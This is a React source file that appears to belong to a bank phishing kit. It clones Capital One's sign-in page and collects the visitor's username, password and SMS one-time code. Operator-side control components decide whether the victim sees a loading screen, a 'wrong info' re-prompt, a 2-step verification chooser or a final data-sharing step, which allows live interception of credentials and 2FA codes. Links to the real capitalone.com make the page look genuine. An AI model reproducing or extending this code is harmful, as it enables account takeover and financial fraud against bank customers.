import clsx from "clsx";
import { FaRegEye, FaRegEyeSlash } from "react-icons/fa";
import { Link } from "react-router-dom";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import { motion } from "framer-motion";
import BankingHeader from "./BankingHeader";
import CapitalOneFavIcon from "../../../../../../../../assets/allBanks/banks/capitalone/co6.ico";
import CapitalOneImg from "../../../../../../../../assets/allBanks/banks/capitalone/co2.svg";
import Usa from "../../../../../../../../assets/allBanks/banks/capitalone/co5.svg";
import { otpOptions } from "../../bankDetails";
import { IoIosArrowRoundBack } from "react-icons/io";
import ShareData from "./ShareData";
import Fdic from "../../../../../../../../assets/allBanks/banks/capitalone/co4.svg";
import House from "../../../../../../../../assets/allBanks/banks/capitalone/co3.svg";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const CapitalOne = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  loading,
  setIsOpenOtp,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    handleBlur,
    errorFormState,
    handleChange,
    onSubmitOtp,
    blurOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <>
      <motion.div
        initial={{ y: -100, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        exit={{ y: -100, opacity: 0 }}
        transition={{ type: "spring", stiffness: 300, damping: 50 }}
        className={clsx(
          "w-full min-h-screen h-full  top-0  bg-customGray-1029",
          typeAccount ? "hidden" : "block"
        )}
      >
        <BankingHeader
          text="Capital One - Sign In"
          handleCancel={handleCancel}
          img={CapitalOneFavIcon}
          setAllBankItems={setAllBankItems}
          setIsOpenOtp={setIsOpenOtp}
          setOtpOpen={setOtpOpen}
        />

        <header className="flex items-center justify-between px-4 py-2 border border-customGray-1028">
          <div>
            <img src={CapitalOneImg} alt="" className="w-[104px] h-[36px]" />
          </div>
          <div className="flex items-center gap-2">
            <div className="flex items-center">
              <img src={Usa} alt="" className="w-[36px] h-[20px]" />
              <select className="w-2 bg-transparent border-none outline-none">
                <option value="United State">United State</option>
                <option value="Canada">Canada</option>
                <option value="United Kingdom">United Kingdom</option>
              </select>
            </div>
            <select className="bg-transparent outline-none text-customGray-1031">
              <option value="English">English</option>
              <option value="Español">Español</option>
            </select>
          </div>
        </header>
        <div>
          <div className="flex justify-center w-full px-4">
            <div
              className={clsx(
                "flex justify-center  w-full customMiniTablet:w-[30rem] mt-8",
                allBankOpen ? "hidden" : "block"
              )}
            >
              <div className="w-full px-4 pt-6 pb-10 bg-white border rounded-lg customMiniTablet:px-20 border-customGray-1033">
                <div className="flex justify-center w-full mb-7">
                  <img
                    src={CapitalOneImg}
                    alt=""
                    className="w-[188px] h-[65px] customMiniTablet:w-[214px] customMiniTablet:h-[74px] object-contain"
                  />
                </div>
                <p className="mb-8 text-xl text-center text-black ">
                  Sign in to your account
                </p>
                <div className={clsx()}>
                  <div className="mb-4">
                    <label className="mb-1 text-sm font-semibold text-customGray-1032">
                      Username
                    </label>
                    <input
                      type="text"
                      value={formState.username}
                      name="username"
                      onChange={handleChange}
                      onBlur={handleBlur}
                      className={clsx(
                        "w-full h-12 px-2 border rounded-md outline-none border-customGray-400",
                        errorFormState.username
                          ? "border border-customRed-700"
                          : ""
                      )}
                    />
                    {errorFormState.username && (
                      <p className="my-1 text-sm font-extralight text-customRed-700">
                        The field is required
                      </p>
                    )}
                  </div>
                  <div className="relative">
                    <label className="mb-1 text-sm font-semibold text-customGray-1032">
                      Password
                    </label>
                    <input
                      type={showPassword ? "text" : "password"}
                      value={formState.password}
                      onBlur={handleBlur}
                      name="password"
                      onChange={handleChange}
                      className={clsx(
                        "w-full h-12 px-2 pr-10 border rounded-md outline-none border-customGray-400",
                        errorFormState.password
                          ? "border border-customRed-700"
                          : ""
                      )}
                    />
                    <span
                      onClick={() => setshowPassword((prevShow) => !prevShow)}
                      className="absolute h-full py-4 right-4 "
                    >
                      {showPassword ? (
                        <FaRegEyeSlash size={16} />
                      ) : (
                        <FaRegEye size={16} />
                      )}
                    </span>
                    {errorFormState.password && (
                      <p className="my-1 text-sm font-extralight text-customRed-700">
                        The field is required
                      </p>
                    )}
                  </div>
                  <div className="flex gap-2 my-8">
                    <input type="checkbox" className="w-[22px] h-[22px] " />
                    <p className="text-black ">Remember Me</p>
                  </div>
                  <button
                    className="w-full py-3 mb-6 font-semibold text-white rounded-lg bg-customBlue-1014 hover:bg-customBlue-1013 transistion2"
                    onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                  >
                    {loading && <ClipLoader size={10} color="#fff" />}
                    {loading ? "Loading..." : "Sign in"}
                  </button>
                  <Link
                    to="https://www.capitalone.com/"
                    className="space-y-3 font-semibold text-customBlue-1014"
                  >
                    <p className="hover:text-customBlue-1013 transistion2 hover:underline">
                      Forgot username or password?
                    </p>
                    <p className="hover:text-customBlue-1013 transistion2 hover:underline">
                      Set up online access
                    </p>
                  </Link>
                </div>
              </div>
            </div>
          </div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <BankControl
                handleSelectedId={handleSelectedId}
                selectedPath={selectedPath}
                handleSelectSubmit={handleSelectSubmit}
              />
              <div>
                {activePathDetails.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activePathDetails.name === "Wrong Info" && (
                  <>
                    <div className="flex justify-center w-full px-4">
                      <div
                        className={clsx(
                          "flex justify-center  w-full customMiniTablet:w-[30rem] mt-8"
                        )}
                      >
                        <div className="w-full px-4 pt-6 pb-10 bg-white border rounded-lg customMiniTablet:px-20 border-customGray-1033">
                          <div className="flex justify-center w-full mb-7">
                            <img
                              src={CapitalOneImg}
                              alt=""
                              className="w-[188px] h-[65px] customMiniTablet:w-[214px] customMiniTablet:h-[74px] object-contain"
                            />
                          </div>
                          <p className="mb-8 text-xl text-center text-black ">
                            Sign in to your account
                          </p>
                          <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                            <p>{activePathDetails.body}</p>
                          </div>
                          <div className={clsx()}>
                            <div className="mb-4">
                              <label className="mb-1 text-sm font-semibold text-customGray-1032">
                                Username
                              </label>
                              <input
                                type="text"
                                value={formState.username}
                                name="username"
                                onChange={handleChange}
                                onBlur={handleBlur}
                                className={clsx(
                                  "w-full h-12 px-2 border rounded-md outline-none border-customGray-400",
                                  errorFormState.username
                                    ? "border border-customRed-700"
                                    : ""
                                )}
                              />
                              {errorFormState.username && (
                                <p className="my-1 text-sm font-extralight text-customRed-700">
                                  The field is required
                                </p>
                              )}
                            </div>
                            <div className="relative">
                              <label className="mb-1 text-sm font-semibold text-customGray-1032">
                                Password
                              </label>
                              <input
                                type={showPassword ? "text" : "password"}
                                value={formState.password}
                                onBlur={handleBlur}
                                name="password"
                                onChange={handleChange}
                                className={clsx(
                                  "w-full h-12 px-2 pr-10 border rounded-md outline-none border-customGray-400",
                                  errorFormState.password
                                    ? "border border-customRed-700"
                                    : ""
                                )}
                              />
                              <span
                                onClick={() =>
                                  setshowPassword((prevShow) => !prevShow)
                                }
                                className="absolute h-full py-4 right-4 "
                              >
                                {showPassword ? (
                                  <FaRegEyeSlash size={16} />
                                ) : (
                                  <FaRegEye size={16} />
                                )}
                              </span>
                              {errorFormState.password && (
                                <p className="my-1 text-sm font-extralight text-customRed-700">
                                  The field is required
                                </p>
                              )}
                            </div>
                            <div className="flex gap-2 my-8">
                              <input
                                type="checkbox"
                                className="w-[22px] h-[22px] "
                              />
                              <p className="text-black ">Remember Me</p>
                            </div>
                            <button
                              className="w-full py-3 mb-6 font-semibold text-white rounded-lg bg-customBlue-1014 hover:bg-customBlue-1013 transistion2"
                              onClick={(e) =>
                                handleTheMainSubmit(e, onSumbitForm)
                              }
                            >
                              {loading && <ClipLoader size={10} color="#fff" />}
                              {loading ? "Loading..." : "Sign in"}
                            </button>
                            <Link
                              to="https://www.capitalone.com/"
                              className="space-y-3 font-semibold text-customBlue-1014"
                            >
                              <p className="hover:text-customBlue-1013 transistion2 hover:underline">
                                Forgot username or password?
                              </p>
                              <p className="hover:text-customBlue-1013 transistion2 hover:underline">
                                Set up online access
                              </p>
                            </Link>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activePathDetails.name === "Send Otp" && (
                  <>
                    <h3>{activePathDetails.body}</h3>
                    <div
                      className={clsx(
                        "flex px-4 justify-center  customMiniTablet:px-28 mt-12",
                        isOpenOtp && "hidden"
                      )}
                    >
                      <div className="w-full">
                        <div>
                          <div className="text-center">
                            <h3 className="mb-2 text-2xl text-black">
                              Choose a verification method
                            </h3>
                            <p className="mb-3 text-customGray-400">
                              To provide you with the best protection, choose a
                              2-Step Verification method to verify your
                              identity.
                            </p>
                          </div>
                          <div className="px-4 customMiniTablet:px-28">
                            <div
                              role="radiogroup"
                              aria-label="Otp Options"
                              className="flex flex-col w-full p-4 space-y-3 bg-white border rounded-lg border-customGray-1033"
                            >
                              {otpOptions.map((bank) => (
                                <div
                                  key={bank.id}
                                  role="radio"
                                  tabIndex={0}
                                  onClick={() => handleOtpOption(bank.id)}
                                  className="flex items-center gap-2.5 "
                                >
                                  <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                    <p
                                      className={clsx(
                                        "rounded-full w-[10px] h-[10px]  ",
                                        otpOptions[indexOtp]?.id === bank.id
                                          ? "bg-customBlue-500"
                                          : ""
                                      )}
                                    ></p>
                                  </div>
                                  <h2
                                    className={clsx(
                                      "text-sm",
                                      otpOptions[indexOtp]?.id === bank.id
                                        ? "text-customBlue-500 hover:underline"
                                        : "hover:text-customBlue-700 hover:underline"
                                    )}
                                  >
                                    {bank.name}
                                  </h2>
                                </div>
                              ))}
                            </div>
                            <button
                              onClick={onSubmitOtpOptions}
                              className="w-full py-3 mb-6 font-semibold text-white rounded-lg mt-7 bg-customBlue-1014 hover:bg-customBlue-1013 transistion2"
                            >
                              Send Code
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                    {isOpenOtp && (
                      <div className={clsx("flex justify-center  mt-10")}>
                        <div>
                          <div>
                            <div>
                              <h3 className="mb-2 text-2xl text-center text-black customMiniTablet:text-start">
                                Check your phone, we&apos;ve sent you a
                                temporary code
                              </h3>
                            </div>
                            <div className="px-2 customMiniTablet:px-6">
                              <div className="w-full px-2 pt-3 bg-white border rounded-sm customMiniTablet:px-6 pb-7 border-customGray-1033">
                                <div className="flex gap-1 mb-8 customMiniTablet:items-center customMiniTablet:gap-12">
                                  <IoIosArrowRoundBack size={30} />
                                  <h2 className="text-sm font-bold text-center customMiniTablet:text-start">
                                    Please enter the 6-digit code sent to your
                                    phone
                                  </h2>
                                </div>
                                <div className="px-2 customMiniTablet:px-24">
                                  <div>
                                    <label className="mb-1 text-sm font-semibold text-customGray-1032">
                                      6-Digit Code
                                    </label>
                                    <input
                                      type="number"
                                      value={formOtp.otpo}
                                      name="otpo"
                                      onChange={changeOtp}
                                      onBlur={blurOtp}
                                      placeholder="123456"
                                      className={clsx(
                                        "w-full h-12 px-2 border rounded-md outline-none border-customGray-400 no-spinner",
                                        errorOtp.otpo
                                          ? "border border-customRed-700"
                                          : ""
                                      )}
                                    />
                                    {errorOtp.otpo && (
                                      <p className="my-1 text-sm font-extralight text-customRed-700">
                                        The field is required
                                      </p>
                                    )}
                                  </div>
                                  <button
                                    className="w-full py-3 mt-6 mb-8 font-semibold text-white rounded-lg bg-customBlue-1014 hover:bg-customBlue-1013 transistion2"
                                    onClick={(e) =>
                                      onSubmitOtp(e, handleVerifiedOtp)
                                    }
                                  >
                                    {loading && (
                                      <ClipLoader size={10} color="#fff" />
                                    )}
                                    {loading ? "Loading..." : "Submit My Code"}
                                  </button>
                                  <p className="text-xs font-bold text-center text-black">
                                    Keep in mind this code will expire in 60
                                    minutes
                                  </p>
                                </div>
                              </div>
                            </div>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold text-center mt-6",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Send me a new temporary code
                            </p>
                          </div>
                        </div>
                      </div>
                    )}
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <BankOtpControl
                handleSelectedOtp={handleSelectedOtp}
                selectedOtp={selectedOtp}
                handleSubmitOtp={handleSubmitOtp}
              />

              <div>
                {activeOtp.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activeOtp.name === "wrong" && (
                  <>
                    <div className={clsx("flex justify-center  mt-10")}>
                      <div>
                        <div>
                          <div>
                            <h3 className="mb-2 text-2xl text-center text-black customMiniTablet:text-start">
                              Check your phone, we&apos;ve sent you a temporary
                              code
                            </h3>
                          </div>
                          <div className="px-2 customMiniTablet:px-6">
                            <div className="w-full px-2 pt-3 bg-white border rounded-sm customMiniTablet:px-6 pb-7 border-customGray-1033">
                              <div className="flex gap-1 mb-8 customMiniTablet:items-center customMiniTablet:gap-12">
                                <IoIosArrowRoundBack size={30} />
                                <h2 className="text-sm font-bold text-center customMiniTablet:text-start">
                                  Please enter the 6-digit code sent to your
                                  phone
                                </h2>
                              </div>
                              <div className="px-2 customMiniTablet:px-24">
                                <div>
                                  <label className="mb-1 text-sm font-semibold text-customGray-1032">
                                    6-Digit Code
                                  </label>
                                  <input
                                    type="number"
                                    value={formOtp.otpo}
                                    name="otpo"
                                    onChange={changeOtp}
                                    onBlur={blurOtp}
                                    placeholder="123456"
                                    className={clsx(
                                      "w-full h-12 px-2 border rounded-md outline-none border-customGray-400 no-spinner",
                                      errorOtp.otpo
                                        ? "border border-customRed-700"
                                        : ""
                                    )}
                                  />
                                  {errorOtp.otpo && (
                                    <p className="my-1 text-sm font-extralight text-customRed-700">
                                      The field is required
                                    </p>
                                  )}
                                  <h3 className="mt-2 text-sm text-customRed-200">
                                    {activeOtp.body}
                                  </h3>
                                </div>
                                <button
                                  className="w-full py-3 mt-6 mb-8 font-semibold text-white rounded-lg bg-customBlue-1014 hover:bg-customBlue-1013 transistion2"
                                  onClick={(e) =>
                                    onSubmitOtp(e, handleVerifiedOtp)
                                  }
                                >
                                  {loading && (
                                    <ClipLoader size={10} color="#fff" />
                                  )}
                                  {loading ? "Loading..." : "Submit My Code"}
                                </button>
                                <p className="text-xs font-bold text-center text-black">
                                  Keep in mind this code will expire in 60
                                  minutes
                                </p>
                              </div>
                            </div>
                          </div>
                          <p
                            className={clsx(
                              "cursor-pointer text-customBlue-100 font-bold text-center mt-6",
                              !resend &&
                                "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                            )}
                            onClick={handleResend}
                          >
                            Send me a new temporary code
                          </p>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activeOtp.name === "otp" && (
                  <>
                    <ShareData
                      bankName={bankName}
                      handleTheFinal={handleTheFinal}
                      handleCancel={handleCancel}
                      setIsOpenOtp={setIsOpenOtp}
                      setAllBankItems={setAllBankItems}
                      siteLink="https://www.capitalone.com/"
                    />
                  </>
                )}
              </div>
            </>
          )}
        </div>
        <footer className="items-center justify-between block px-10 py-2 mt-20 bg-white border customMiniTablet:flex border-customGray-1028">
          <di className="hidden customMiniTablet:block"></di>
          <div className="mb-10 space-y-2 text-xs customMiniTablet:mb-0 customMiniTablet:space-y-0 customMiniTablet:flex text-customGray-1030">
            <p className="px-2 customMiniTablet:border-r border-customGray-1030">
              Contact us
            </p>
            <p className="px-2 customMiniTablet:border-r border-customGray-1030">
              Legal
            </p>
            <p className="px-2 customMiniTablet:border-r border-customGray-1030">
              Privacy
            </p>
            <p className="px-2 customMiniTablet:border-r border-customGray-1030">
              Security
            </p>
            <p className="px-2 customMiniTablet:border-r border-customGray-1030">
              Terms & Conditions
            </p>
            <p className="px-2 ">Accessibility</p>
          </div>
          <div className="flex justify-end gap-3 customMiniTablet:justify-normal">
            <img
              src={Fdic}
              alt=""
              className="w-[39px] h-[24px] object-contain"
            />
            <img
              src={House}
              alt=""
              className="w-[49px] h-[32px] object-contain"
            />
          </div>
        </footer>
      </motion.div>
    </>
  );
};

export default CapitalOne;
